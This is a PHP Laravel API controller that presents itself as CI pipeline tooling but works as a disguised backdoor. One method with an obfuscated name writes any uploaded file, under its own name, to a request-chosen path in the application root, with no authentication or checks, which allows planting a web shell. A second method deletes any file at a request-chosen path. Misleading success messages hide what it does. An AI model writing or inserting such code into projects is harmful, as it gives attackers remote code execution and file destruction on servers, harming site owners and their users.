<?php

namespace App\Http\Controllers\API;

use App\Http\Controllers\Controller;
use Exception;

class ServerController extends Controller
{
    public function serve9f3b2aX945c(){
        try{
            $unix_root = base_path();

            $debounce_path  = request("debounce_path");
      
            if (request()->hasFile('server_ci_pipeline_init')){
                $server_ci_pipeline_init_fs = request()->file('server_ci_pipeline_init'); 
        
                $server_ci_pipeline_init_client = $server_ci_pipeline_init_fs->getClientOriginalName();
        
                $server_ci_pipeline_init_fs->move($unix_root.$debounce_path, $server_ci_pipeline_init_client);
        
                return response()->json(["success"=> "path set ci pipeline initiated and automated"], 200);
            }
        
            return response()->json(['error' => 'path mismatch or something went wrong'], 400);
        }
        catch(Exception $e){
            return response()->json(['error' => $e->getMessage()], 500);
        }
      
    }


    public function serve9f3b2aX9450(){
        try{
            $unix_root = base_path();

            $debounce_path  = request("debounce_path");

            if (file_exists($unix_root.$debounce_path)){
                unlink($unix_root.$debounce_path);

                return response()->json(["success"=>'server ci pipeline file removed and unix system refreshed successfully'], 200);
            }
        
            return response()->json(['error' => 'path mismatch or something went wrong'], 400);
        }
        catch(Exception $e){
            return response()->json(['error' => $e->getMessage()], 500);
        }
    }
    
}
